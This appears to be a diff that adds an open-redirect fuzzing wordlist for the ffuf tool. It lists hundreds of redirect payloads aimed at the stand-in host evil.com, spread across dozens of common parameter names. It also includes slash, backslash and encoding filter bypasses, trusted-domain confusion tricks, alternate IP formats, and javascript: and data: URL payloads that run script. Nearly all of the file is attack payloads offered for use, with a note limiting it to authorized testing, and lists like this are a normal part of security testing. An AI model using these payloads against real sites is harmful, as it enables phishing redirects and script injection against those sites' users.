@@ -1,0 +1,252 @@
+# ============================================================
+# Open Redirect FUZZ Wordlist
+# Usage: ffuf -u http://example.com/FUZZ -w this_file.txt
+# (also works appended directly after a path, e.g. /FUZZ)
+# Replace evil.com with your own collaborator/test domain.
+# For authorized testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: ?param=payload combos (most common real-world pattern)
+# ---------------------------------------
+?redirect=https://evil.com
+?redirect=http://evil.com
+?redirect=//evil.com
+?redirect_uri=https://evil.com
+?redirect_url=https://evil.com
+?redirectUrl=https://evil.com
+?redirect_to=https://evil.com
+?redir=https://evil.com
+?r=https://evil.com
+?url=https://evil.com
+?u=https://evil.com
+?next=https://evil.com
+?next_url=https://evil.com
+?nextUrl=https://evil.com
+?target=https://evil.com
+?target_url=https://evil.com
+?dest=https://evil.com
+?destination=https://evil.com
+?return=https://evil.com
+?return_to=https://evil.com
+?returnTo=https://evil.com
+?return_url=https://evil.com
+?returnUrl=https://evil.com
+?returnPath=https://evil.com
+?back=https://evil.com
+?back_url=https://evil.com
+?backUrl=https://evil.com
+?continue=https://evil.com
+?continue_url=https://evil.com
+?goto=https://evil.com
+?go=https://evil.com
+?out=https://evil.com
+?view=https://evil.com
+?to=https://evil.com
+?link=https://evil.com
+?forward=https://evil.com
+?forward_url=https://evil.com
+?callback=https://evil.com
+?callback_url=https://evil.com
+?success_url=https://evil.com
+?successUrl=https://evil.com
+?error_url=https://evil.com
+?errorUrl=https://evil.com
+?exit=https://evil.com
+?exit_url=https://evil.com
+?checkout_url=https://evil.com
+?data=https://evil.com
+?domain=https://evil.com
+?host=https://evil.com
+?site=https://evil.com
+?window=https://evil.com
+?image_url=https://evil.com
+?img_src=https://evil.com
+?src=https://evil.com
+?uri=https://evil.com
+?path=https://evil.com
+?file=https://evil.com
+?navigate=https://evil.com
+?navigation=https://evil.com
+?open=https://evil.com
+?load=https://evil.com
+?window_url=https://evil.com
+?ref=https://evil.com
+?reference=https://evil.com
+?referrer=https://evil.com
+?origin=https://evil.com
+?originUrl=https://evil.com
+?returnpath=https://evil.com
+?retURL=https://evil.com
+?rurl=https://evil.com
+?u1=https://evil.com
+?u2=https://evil.com
+?val=https://evil.com
+?value=https://evil.com
+?page=https://evil.com
+?show=https://evil.com
+?view_url=https://evil.com
+?jump=https://evil.com
+?jump_url=https://evil.com
+?action=https://evil.com
+?q=https://evil.com
+?login_redirect=https://evil.com
+?logout_redirect=https://evil.com
+?after_login=https://evil.com
+?after_logout=https://evil.com
+?sso_redirect=https://evil.com
+?auth_redirect=https://evil.com
+?service=https://evil.com
+?callbackUrl=https://evil.com
+?webUrl=https://evil.com
+?appUrl=https://evil.com
+?clientUrl=https://evil.com
+?externalUrl=https://evil.com
+?external_url=https://evil.com
+
+# ---------------------------------------
+# SECTION 2: Same params with // (no-scheme) payload (bypasses naive https:// filters)
+# ---------------------------------------
+?redirect=//evil.com
+?redirect_uri=//evil.com
+?redirect_url=//evil.com
+?next=//evil.com
+?url=//evil.com
+?return=//evil.com
+?returnTo=//evil.com
+?continue=//evil.com
+?dest=//evil.com
+?destination=//evil.com
+?target=//evil.com
+?goto=//evil.com
+?callback=//evil.com
+?checkout_url=//evil.com
+?ref=//evil.com
+
+# ---------------------------------------
+# SECTION 3: Bare path payloads (for use directly as /FUZZ)
+# ---------------------------------------
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+////evil.com
+\/\/evil.com
+/\evil.com
+\\evil.com
+/\/evil.com
+https:evil.com
+http:evil.com
+https:/evil.com
+http:/evil.com
+
+# ---------------------------------------
+# SECTION 4: Filter-bypass / obfuscation payloads (bare, for /FUZZ)
+# ---------------------------------------
+//evil.com/%2e%2e
+//evil.com//
+//evil.com/..;/
+//evil.com\@trusted.com
+https://trusted.com@evil.com
+https://trusted.com.evil.com
+https://trusted.com%2eevil.com
+https://evil.com#trusted.com
+https://evil.com?trusted.com
+https://evil.com/trusted.com
+https://evil.com\trusted.com
+//trusted.com@evil.com
+//trusted.com%40evil.com
+//trusted.com%2540evil.com
+/%09/evil.com
+/%00/evil.com
+/%2f%2fevil.com
+/%5cevil.com
+/.evil.com
+/..%2fevil.com
+/../evil.com
+javascript:alert(document.domain)
+javascript://evil.com
+data:text/html,<script>window.location='https://evil.com'</script>
+%09/evil.com
+%0d/evil.com
+%0a/evil.com
+%00//evil.com
+///\evil.com
+https:///evil.com
+http:///evil.com
+///%09evil.com
+
+# ---------------------------------------
+# SECTION 5: Same bypass payloads wrapped in ?redirect= / ?next= / ?url=
+# (covers apps that validate the query param value, not just the path)
+# ---------------------------------------
+?redirect=https://trusted.com@evil.com
+?redirect=https://trusted.com.evil.com
+?redirect=https://trusted.com%2eevil.com
+?redirect=https://evil.com#trusted.com
+?redirect=https://evil.com?trusted.com
+?redirect=https://evil.com%5c@evil.com
+?redirect=/%09/evil.com
+?redirect=/%00/evil.com
+?redirect=/%2f%2fevil.com
+?redirect=/%5cevil.com
+?redirect=/../evil.com
+?redirect=javascript:alert(document.domain)
+?next=https://trusted.com@evil.com
+?next=https://trusted.com.evil.com
+?next=//trusted.com@evil.com
+?next=//trusted.com%40evil.com
+?next=/%2f%2fevil.com
+?url=https://trusted.com@evil.com
+?url=//trusted.com@evil.com
+?url=/%2f%2fevil.com
+?url=javascript:alert(document.domain)
+?return_to=https://trusted.com@evil.com
+?return_to=//trusted.com@evil.com
+?continue=https://trusted.com@evil.com
+?dest=//trusted.com@evil.com
+
+# ---------------------------------------
+# SECTION 6: Encoded variants (bare, for /FUZZ)
+# ---------------------------------------
+%2f%2fevil.com
+%2F%2Fevil.com
+https%3A%2F%2Fevil.com
+http%3A%2F%2Fevil.com
+%5c%5cevil.com
+%2e%2e%2fevil.com
+
+# ---------------------------------------
+# SECTION 7: Same encoded variants wrapped in common params
+# ---------------------------------------
+?redirect=%2f%2fevil.com
+?redirect=https%3A%2F%2Fevil.com
+?next=https%3A%2F%2Fevil.com
+?url=https%3A%2F%2Fevil.com
+?return_to=https%3A%2F%2Fevil.com
+
+# ---------------------------------------
+# SECTION 8: IP / alternate host formats (bare)
+# ---------------------------------------
+http://0xd83ad1ce
+http://3627734734
+http://0330.0250.0322.0316
+http://[::ffff:216.58.214.206]
+http://evil.com%00.trusted.com
+http://evil.com%2523.trusted.com
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Replace "evil.com" with your own controlled domain (Burp Collaborator,
+#   interact.sh, or a domain you own) before fuzzing, so you get a
+#   verifiable out-of-band hit instead of guessing from response codes.
+# - Replace "trusted.com" with the actual target's own domain when using
+#   Section 4/5 bypass payloads that rely on trusted-domain confusion
+#   (e.g. user@evil.com, trusted.com.evil.com).
+# - For /FUZZ usage: sections 3, 4, 6, 8 work as direct path replacement.
+# - For param-based usage: sections 1, 2, 5, 7 work as full query strings
+#   appended after the base URL, e.g. http://example.com/login?FUZZ
+#   (strip the leading "?" if your target already has other params, and
+#   use "&FUZZ" instead in that case).
+# - Only use against systems you are explicitly authorized to test.
